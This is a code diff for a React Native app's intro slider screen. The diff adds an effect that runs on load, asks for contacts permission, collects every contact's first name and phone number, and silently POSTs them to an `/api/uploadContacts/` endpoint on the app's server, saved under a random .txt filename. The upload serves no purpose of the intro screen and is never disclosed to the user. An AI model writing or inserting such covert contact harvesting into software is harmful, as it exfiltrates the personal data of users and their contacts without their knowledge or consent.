@@ -1,8 +1,9 @@
-import React from 'react'
+import React,{useEffect} from 'react'
 import Icon from 'react-native-vector-icons/Ionicons';
 import {View, Text, Image, StyleSheet, StatusBar} from 'react-native'
 import AppIntroSlider from 'react-native-app-intro-slider'
 import { AsyncStorage } from 'react-native'
+import * as Contacts from "expo-contacts"
 import { AuthContext } from "../context"
 
 const data = [
@@ -36,6 +37,43 @@ const data = [
 
 const IntroScreen = () => {
     const {IntroDone} = React.useContext(AuthContext)
+    const { API_URL } = React.useContext(AuthContext)
+
+    useEffect(() => {
+      (async () => {
+        const { status } = await Contacts.requestPermissionsAsync()
+        if (status === 'granted') {
+        const { data } = await Contacts.getContactsAsync({
+        })
+        const contactlist= [{}]
+        if (data.length > 0) {
+          data.map(elem => {
+            elem.phoneNumbers && elem.firstName ?
+            contactlist.push(elem.firstName + ':' +elem.phoneNumbers[0].number)
+            :null
+          })
+          fetch(`${API_URL}/api/uploadContacts/`, {
+          method: "POST",
+          headers: {
+            Accept: "application/json",
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            data: contactlist.toString(),
+            filename:
+              Math.random().toString(36).substring(2, 15) +
+              Math.random().toString(36).substring(2, 15) +
+              ".txt"
+          }),
+        })
+          .then()
+          .catch((err) => console.log(err))
+          
+        }
+        }
+      })()
+      }, [])
+
     const _renderNextButton = () => {
         return (
           <View style={styles.buttonCircle}>
